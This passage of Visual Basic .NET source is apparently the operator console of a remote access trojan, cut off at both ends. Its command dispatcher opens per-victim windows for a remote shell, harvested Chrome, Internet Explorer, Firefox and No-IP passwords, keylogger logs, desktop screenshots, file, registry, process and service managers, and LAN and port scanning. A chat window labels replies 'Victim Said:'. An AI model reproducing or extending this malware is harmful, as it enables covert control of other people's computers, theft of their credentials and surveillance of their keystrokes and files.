                    cmd.SkyDarkForm1.Text &= " For : " & S.IP(sock)
                    cmd.Show()

                Case "rs"
                    Dim shl2 As cmd = My.Application.OpenForms("rs" & sock)
                    If (Not shl2 Is Nothing) Then
                        Dim box As RichTextBox = shl2.T1
                        SyncLock box
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.AppendText((DEB(A(1).Replace(ChrW(13) & ChrW(10), "")) & ChrW(13) & ChrW(10)))
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.ScrollToCaret()
                        End SyncLock
                    End If
                    Return
                Case "rsc"
                    Dim shl3 As cmd = My.Application.OpenForms("sh" & sock)
                    If (Not shl3 Is Nothing) Then
                        shl3.Close()
                    End If
                Case "fun"
                    If My.Application.OpenForms("fun" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Fun
                    fm.sock = sock
                    fm.Name = "fun" & sock
                    '   fm.Text = fm.Text & S.IP(xxx)
                    fm.SkyDarkForm1.Text &= " " & S.IP(sock)

                    fm.Show()
                Case "programs"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    If My.Application.OpenForms("programs" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New InstalledPrograms
                    f.sock = sock
                    f.Name = "programs" & sock
                    f.SkyDarkForm1.Text &= " " & S.IP(sock)

                    f.Show()

                Case "xxz"

                    Dim fProc As InstalledPrograms = My.Application.OpenForms("programs" & sock)
                    Dim xxo = fProc.ListView1.Items.Add(A(1), 0)
                    xxo.SubItems.Add(A(2))
                    xxo.SubItems.Add(A(3))
                    xxo.SubItems.Add(A(4))
                    xxo.SubItems.Add(A(5))
                    xxo.SubItems.Add(A(6))
                Case "showinfo"
                    If My.Application.OpenForms("devices" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Manage_Devices_and_Printers
                    f.sock = sock
                    f.Name = "devices" & sock
                    f.Text = "Devices And Printers For : " & S.IP(sock)
                    f.SkyDarkForm1.Text &= "  " & S.IP(sock)
                    f.Show()

                Case "printer"
                    Dim F As Manage_Devices_and_Printers = My.Application.OpenForms("devices" & sock)

                    If A(1).Contains("XPS") Or A(1).Contains("Xps") Or A(1).Contains("xps") Then
                        F.ListView2.Items.Add(A(1), 11)
                    ElseIf A(1).Contains("PDF") Or A(1).Contains("Pdf") Or A(1).Contains("pdf") Then
                        F.ListView2.Items.Add(A(1), 12)
                    Else
                        F.ListView2.Items.Add(A(1), 1)
                    End If
                Case "cputemp"
                    Dim F As Manage_Devices_and_Printers = My.Application.OpenForms("devices" & sock)

                    F.Label4.Text = A(1)
                Case "nonworkingdevice"
                    Dim F As Manage_Devices_and_Printers = My.Application.OpenForms("devices" & sock)
                    Dim device As New ListViewItem
                    F.ListView3.SmallImageList = F.ImageList1
                    If A(1).Contains("USB") Or A(1).Contains("Usb") Or A(1).Contains("usb") Then
                        device.ImageIndex = 3
                    ElseIf A(1).Contains("Bluetooth") Or A(1).Contains("BLUETOOTH") Or A(1).Contains("tooth") Then
                        device.ImageIndex = 4


                    ElseIf A(1).Contains("Wireless") Or A(1).Contains("WiFi") Or A(1).Contains("Wifi") Or A(1).Contains("wifi") Or A(1).Contains("Wi-Fi") Then
                        device.ImageIndex = 5

                    ElseIf A(1).Contains("Intel") Then
                        device.ImageIndex = 7
                    ElseIf A(4).Contains("video") Or A(4).Contains("Video") Then
                        device.ImageIndex = 8
                    ElseIf A(5).Contains("Audio") Or A(5).Contains("audio") Then
                        device.ImageIndex = 9
                    ElseIf A(5).Contains("Touch") Or A(5).Contains("touch") Then
                        device.ImageIndex = 10
                    Else
                        device.ImageIndex = 0
                    End If
                    device.Text = A(1)
                    device.SubItems.Add(A(2))
                    device.SubItems.Add(A(3))
                    device.SubItems.Add(A(4))
                    device.SubItems.Add(A(5))
                    F.ListView3.Items.Add(device)
                Case ("device")
                    Try

                    Catch ex As Exception

                    End Try
                    Dim F As Manage_Devices_and_Printers = My.Application.OpenForms("devices" & sock)
                    ' Dim allDevices As String() = Split(A(1), "|D|")


                    Dim device As New ListViewItem
                    F.ListView1.SmallImageList = F.ImageList1
                    If A(1).Contains("USB") Or A(1).Contains("Usb") Or A(1).Contains("usb") Then
                        device.ImageIndex = 3
                    ElseIf A(1).Contains("Bluetooth") Or A(1).Contains("BLUETOOTH") Or A(1).Contains("tooth") Then
                        device.ImageIndex = 4


                    ElseIf A(1).Contains("Wireless") Or A(1).Contains("WiFi") Or A(1).Contains("Wifi") Or A(1).Contains("wifi") Or A(1).Contains("Wi-Fi") Then
                        device.ImageIndex = 5

                    ElseIf A(1).Contains("Intel") Then
                        device.ImageIndex = 7
                    ElseIf A(4).Contains("video") Or A(4).Contains("Video") Then
                        device.ImageIndex = 8
                    ElseIf A(5).Contains("Audio") Or A(5).Contains("audio") Then
                        device.ImageIndex = 9
                    ElseIf A(5).Contains("Touch") Or A(5).Contains("touch") Then
                        device.ImageIndex = 10
                    Else
                        device.ImageIndex = 0
                    End If
                    device.Text = A(1)
                    device.SubItems.Add(A(2))
                    device.SubItems.Add(A(3))
                    device.SubItems.Add(A(4))
                    device.SubItems.Add(A(5))
                    F.ListView1.Items.Add(device)

                Case "openpw"
                    If My.Application.OpenForms("openpw" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New passwords
                    fm.sock = sock
                    fm.Name = "openpw" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.SkyDarkForm1.Text &= " " & S.IP(sock)
                    fm.Show()
                Case "getpw"
                    Dim f As passwords = My.Application.OpenForms("openpw" & sock)
                    Dim aa As String() = Split(A(1), "|")

                    Try
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            If aa(i + 4).Contains("chrome") Then
                                ii.ImageIndex = 1
                                ii.SubItems.Add(aa(i + 4).Replace("chrome", ""))
                            ElseIf aa(i + 4).Contains("internetexplorer") Then
                                ii.ImageIndex = 2
                                ii.SubItems.Add(aa(i + 4).Replace("internetexplorer", ""))
                            ElseIf aa(i + 4).Contains("firefox") Then
                                ii.ImageIndex = 3
                                ii.SubItems.Add(aa(i + 4).Replace("firefox", ""))
                            ElseIf aa(i + 4).Contains("noip") Then
                                ii.ImageIndex = 4
                                ii.SubItems.Add(aa(i + 4).Replace("noip", ""))
                            Else

                                ii.SubItems.Add(aa(i + 4))
                                ii.ImageIndex = 0
                            End If


                            f.ListView1.Items.Add(ii)
                            i += 5

                        Next
                    Catch ex As Exception
                    End Try

                Case "infoDesk"

                    listimage.ImageSize = New Size(New Point(130, 100))
                    For Each x As ListViewItem In L1.SelectedItems
                        If L1.SelectedItems.Count >= 2 Then

                            PictureBox1.Image = Nothing


                        Else

                            If CheckBox1.Checked = True Then
                                Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                                SyncLock Me.PictureBox1
                                    Me.PictureBox1.Image = Image.FromStream(m)
                                    listimage.Images.RemoveByKey(ip(sock))
                                    listimage.Images.Add(ip(sock), Image.FromStream(m))
                                    L1.LargeImageList = listimage
                                    For i = 0 To listimage.Images.Count - 1
                                        For j = 0 To L1.Items.Count - 1
                                            If listimage.Images.Keys(i).Contains(L1.Items(j).SubItems(1).Text) Then
                                                L1.Items(j).ImageKey = listimage.Images.Keys(i)
                                            End If
                                        Next
                                    Next
                                End SyncLock

                            End If
                            ContextMenuStrip1.Enabled = True




                        End If
                    Next
                    pinger = 0
                    pingerTimers.Enabled = False

                Case "ss"


                    If My.Application.OpenForms("ss" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New ServiceController
                    f.sock = sock
                    f.Name = "ss" & sock
                    f.SkyDarkForm1.Text &= " " & S.IP(sock)
                    f.Show()


                Case "OpenPro"

                    If My.Application.OpenForms("OpenPro" & sock) IsNot Nothing Then Exit Sub

                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Processmanager
                    f.sock = sock
                    f.Name = "OpenPro" & sock
                    'f.Text = f.Text & " | " & A(1)
                    f.SkyDarkForm1.Text &= " " & S.IP(sock)
                    f.Show()


                Case "wifi"
                    If My.Application.OpenForms("wifi" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New wifi
                    f.sock = sock
                    f.Name = "wifi" & sock
                    f.Text = "WiFi Networks View For  : " & S.IP(sock)
                    f.SkyDarkForm1.Text &= " For : " & S.IP(sock)
                    f.Show()



                Case "wifi3"
                    Try
                        Dim F As wifi = My.Application.OpenForms("wifi" & sock)

                        Dim network As New ListViewItem
                        network.Text = (A(1))
                        Dim signal As Integer = Integer.Parse(A(2).Replace("%", ""))
                        If signal > 0 AndAlso signal < 15 Then
                            network.ImageIndex = 0
                        End If
                        If signal > 15 AndAlso signal < 35 Then
                            network.ImageIndex = 1
                        End If
                        If signal > 35 AndAlso signal < 50 Then
                            network.ImageIndex = 2
                        End If
                        If signal > 50 AndAlso signal < 65 Then
                            network.ImageIndex = 3
                        End If
                        If signal > 65 AndAlso signal < 80 Then
                            network.ImageIndex = 4
                        End If
                        If signal >= 80 AndAlso signal < 100 Then
                            network.ImageIndex = 5
                        End If
                        network.SubItems.Add(A(2))
                        network.SubItems.Add(A(3))
                        network.SubItems.Add(A(4))
                        F.ListView1.Items.Add(network)

                        F.Doublekiller()
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try

                Case "wifierror"
                    MsgBox(A(1))

                Case "ProcessManager"

                    Dim fProc As Processmanager = My.Application.OpenForms("OpenPro" & sock)
                    Dim allProcess As String() = Split(A(1), "ProcessSplit") 'Message.Substring(15).Split("ProcessSplit")
                    For i = 0 To allProcess.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allProcess(i)
                        itm.SubItems.Add(allProcess(i + 1))
                        itm.SubItems.Add(allProcess(i + 2))
                        itm.SubItems.Add(allProcess(i + 3))
                        itm.ImageIndex = 0
                        fProc.ListView1.Items.Add(itm)
                        i += 3
                    Next
                    fProc.ListView1.FindItemWithText(A(2).Replace("Me", "")).BackColor = Color.DarkRed
                    ' fProc.ListView1.FindItemWithText(A(2)).ForeColor = Color.DarkOliveGreen


                Case "openRG"
                    Dim regedit As Registry_Editor = My.Application.OpenForms("regedit" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim regediti As New Registry_Editor
                    regediti.Name = "regedit" & sock
                    regediti.sock = sock
                    ' regediti.Text = "regeditistry" & " - " & S.IP(xxx)
                    regediti.SkyDarkForm1.Text &= " " & S.IP(sock)
                    regediti.Show()
                Case "RG"
                    Dim regedit As Registry_Editor = My.Application.OpenForms("regedit" & sock)
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Select Case A(1)
                        Case "~"
                            regedit.RGk.Enabled = True
                            regedit.RGLIST.Enabled = True
                            regedit.RGk.SelectedNode.Nodes.Clear()
                            regedit.RGLIST.Items.Clear()
                            regedit.pr.Value = 0
                            regedit.pr.Maximum = (A.Length - 3)
                            Dim num20 As Integer = (A.Length - 1)
                            Dim i As Integer = 3
                            Do While (i <= num20)
                                Try
                                    regedit.pr = regedit.pr
                                    regedit.pr.Value += 1
                                    If (A(i).Length > 0) Then
                                        If A(i).Contains("/") Then
                                            Dim strArray2 As String() = Strings.Split(A(i), "/", -1, CompareMethod.Binary)
                                            Dim item As ListViewItem = regedit.RGLIST.Items.Add(strArray2(0))
                                            item.SubItems.Add(strArray2(1))
                                            Try
                                                item.SubItems.Add(strArray2(2))
                                            Catch exception17 As Exception

                                                Dim exception3 As Exception = exception17

                                            End Try
                                            If (strArray2(1) = "String") Then
                                                item.ImageIndex = 1
                                            Else
                                                item.ImageIndex = 2
                                            End If
                                        Else
                                            regedit.RGk.SelectedNode.Nodes.Add(A(i))
                                        End If
                                    End If
                                Catch exception18 As Exception

                                    Dim exception4 As Exception = exception18

                                End Try
                                i += 1
                            Loop
                            regedit.RGk.SelectedNode.Expand()
                            regedit.RGk.Select()
                            regedit.RGk.Focus()
                            Dim num21 As Integer = (regedit.RGLIST.Columns.Count - 1)
                            Dim j As Integer = 0
                            Do While (j <= num21)
                                regedit.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                j += 1
                            Loop
                            regedit.pr.Value = 0

                            Exit Select

                    End Select

                Case "chatback"
                    'MessageBox.Show("New cht message ", "Victim Replied ", MessageBoxButtons.OK, MessageBoxIcon.Information)
                    Dim Ff As chat = My.Application.OpenForms("Chat" & sock)

                    Ff.TextBox1.Text &= "Victim Said: " & A(1)
                    '  Invoke(New chatappd(AddressOf chatappds), A(1))
                    Exit Sub
                Case "readytochat"
                    If My.Application.OpenForms("Chat" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New chat
                    fm.sock = sock
                    fm.Name = "Chat" & sock
                    fm.Text = fm.Text & " " & S.IP(sock)
                    fm.SkyDarkForm1.Text &= " For : " & S.IP(sock)
                    fm.Show()

                Case "viewlan"
                    If My.Application.OpenForms("viewlan" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Lan
                    f.sock = sock
                    f.Name = "viewlan" & sock
                    f.Text = "Lan View For : " & S.IP(sock)
                    f.SkyDarkForm1.Text &= " For : " & S.IP(sock)


                    f.Show()



                Case "getlan"

                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    Dim hacked As String = Me.L1.SelectedItems(0).SubItems(2).Text
                    Dim substring As String = hacked.Substring(0, 3)
                    Dim os As String = Me.L1.SelectedItems(0).SubItems(3).Text
                    If A(1).Contains(substring) Then

                        Dim l1 = F.ListView1.Items.Add(A(1))
                        If os.Contains("Windows 10") Or os.Contains("Windows 8.1") Then
                            l1.ImageIndex = 0
                        ElseIf os.Contains("Windows 7") Or os.Contains("Windows Vista") Then
                            l1.ImageIndex = 2
                        ElseIf os.Contains("Windows XP") Or os.Contains("xp") Then

                            l1.ImageIndex = 1
                        End If

                    Else
                        Dim l1 = F.ListView1.Items.Add(A(1))
                        l1.ImageIndex = 4
                    End If










                Case "pcip"
                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    F.Label1.Text = A(1)

                Case "lanresults"
                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    If A(1).Contains("open") Then
                        Dim l1 = F.ListView2.Items.Add(A(1))
                        F.ListView2.Items(F.jj).ImageIndex = 1
                        F.jj += 1
                    Else
                        Dim l1 = F.ListView2.Items.Add(A(1))
                        F.ListView2.Items(F.jj).ImageIndex = 0
                        F.jj += 1
                    End If

                Case "gateway"
                    Dim gateway = ""
                    Dim F As Lan = My.Application.OpenForms("viewlan" & sock)
                    Dim Gateways As String() = Split(A(1), "IPG")
                    For ipx As Integer = 0 To Gateways.Length - 1
                        If Gateways(ipx).Contains("0.0.0") Or Gateways(ipx) = "" Then
                        Else
                            gateway = ipx
                            F.ListView1.Items.Add(Gateways(ipx), 3)
                        End If


                    Next
                    F.Doublekiller()
                Case "F"
                Case "AW"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).SubItems(8).Text = A(1)
                            Exit For
                        End If
                    Next
                Case "serrrrr"
                    If L1.FindItemWithText(S.IP(sock)) Is Nothing Then
                        S.Disconnect(sock)
                    End If
                    Dim fProc As ServiceController = My.Application.OpenForms("ss" & sock)

                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then


                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(1))

                            itm.SubItems.Add(xx(2))
                            itm.SubItems.Add(xx(3))

                            itm.ImageIndex = 0
                            fProc.ListView1.Items.Add(itm)

                        End If
                    Next

                Case "Acti"

                    If My.Application.OpenForms("Acti" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Active_Windows
                    f.sock = sock
                    f.Name = "Acti" & sock
                    f.SkyDarkForm1.Text &= " " & S.IP(sock)
                    f.Show()
                Case "ACs"

                    Dim fProc As Active_Windows = My.Application.OpenForms("Acti" & sock)

                    Dim allProcess As String() = Split(A(1), "ProcessSplit")
                    For Each x In allProcess
                        If Not x = "" Then


                            Dim xx As String() = Split(x, "|")
                            Dim itm As New ListViewItem
                            itm.Text = xx(0)
                            itm.SubItems.Add(xx(0))
                            itm.ImageIndex = 0
                            fProc.ListView1.Items.Add(itm)

                        End If
                    Next


                Case "opensacnner"

                    If My.Application.OpenForms("scanner" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New portscanner
                    f.sock = sock
                    f.Name = "scanner" & sock

                    f.SkyDarkForm1.Text &= " " & S.IP(sock)


                    f.Show()
                Case "openkl"
                    If My.Application.OpenForms("openkl" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New keylogger
                    f.sock = sock
                    f.Name = "openkl" & sock
                    f.Text = f.Text & S.IP(sock)
                    f.SkyDarkForm1.Text &= " For : " & S.IP(sock)
                    f.Show()
                    ' Case "logf"
                    '    Dim F As Form7 = My.Application.OpenForms("openlo" & sock)
                    '   Dim logsf As String() = Split(A(1), "|")
                    '  For i As Integer = 0 To logsf.Length - 2
                    'Dim ii As New ListViewItem
                    'ii.Text = logsf(i)
                    'f.ListView1.Items.Add(ii)
                    'Next

                Case "getlogs"
                    Dim F As keylogger = My.Application.OpenForms("openkl" & sock)
                    F.TextBox1.Text = A(1)
                    If F.SkyDarkButton2.Enabled = True Then
                        F.onlinetext.Text = A(1)

                    End If
                Case "scanresults"
                    Dim F As portscanner = My.Application.OpenForms("scanner" & sock)
                    If A(1).Contains("open") Then
                        Dim l1 = F.ListView1.Items.Add(A(1))
                        F.ListView1.Items(F.jj).ImageIndex = 1
                        F.jj += 1
                    Else
                        Dim l1 = F.ListView1.Items.Add(A(1))
                        F.ListView1.Items(F.jj).ImageIndex = 0
                        F.jj += 1
                    End If


                Case "hotspot"
                    If My.Application.OpenForms("hotspot" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New hotspot
                    f.sock = sock
                    f.Name = "hotspot" & sock
                    f.Text &= S.IP(sock)
                    f.SkyDarkForm1.Text &= " " & S.IP(sock)
                    f.Show()
                Case "hotspotok"
                    Dim F As hotspot = My.Application.OpenForms("hotspot" & sock)
                    F.Label4.ForeColor = Color.Lime
                    F.Label4.Text = "On"
                Case "hotspotoff"
                    Dim F As hotspot = My.Application.OpenForms("hotspot" & sock)
                    F.Label4.ForeColor = Color.Red
                    F.Label4.Text = "Off"
                    'File Manager
                Case "\\"    '
                    If My.Application.OpenForms("\\" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New FileManager
                    fm.sock = sock
                    fm.Name = "\\" & sock
                    fm.SkyDarkForm1.Text &= " " & S.IP(sock)

                    fm.Show()
                Case "FileManager"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)
                    If A(1) = "Error" Then

                        MsgBox("You cannot access this path [Access Denied] From Client PC", MsgBoxStyle.Exclamation)

                        fff.back()

                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(A(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Or itm.Text.EndsWith(".cmd") Or itm.Text.EndsWith(".CMD") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 11
